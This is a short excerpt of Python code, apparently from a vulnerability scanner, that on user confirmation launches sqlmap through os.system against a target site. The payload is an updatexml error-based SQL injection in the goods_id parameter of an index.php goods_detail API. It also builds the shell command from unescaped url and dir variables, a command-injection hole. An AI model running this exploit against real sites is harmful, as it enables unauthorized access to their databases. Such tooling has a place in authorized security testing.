            ...
            if not self.batch:
                ...
                if choose == "y":
                    ...
                    try:
                        ...
                        os.system(f"cd cve/VulsScan/sqlmap/ && python sqlmap.py -u \"{url}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,*,0x7e),1)\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
